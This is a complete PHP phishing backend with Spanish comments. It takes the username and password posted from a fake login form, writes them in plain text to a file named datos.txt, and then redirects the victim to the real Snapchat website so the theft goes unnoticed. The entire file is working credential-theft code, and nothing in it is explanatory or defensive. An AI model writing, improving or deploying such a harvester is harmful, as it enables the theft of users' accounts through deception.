<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST['usuario'];
    $contraseña = $_POST['contraseña'];

    // Especifica la ruta y el nombre del archivo de texto
    $archivo = 'datos.txt';

    // Abre el archivo en modo de escritura
    $fp = fopen($archivo, 'a');

    // Escribe los datos en el archivo
    fwrite($fp, "Usuario: " . $usuario . "\n");
    fwrite($fp, "Contraseña: " . $contraseña . "\n\n");

    // Cierra el archivo
    fclose($fp);

    // Redirige al usuario a la página oficial de Snapchat
    header("Location: https://www.snapchat.com");
    exit();
}
?>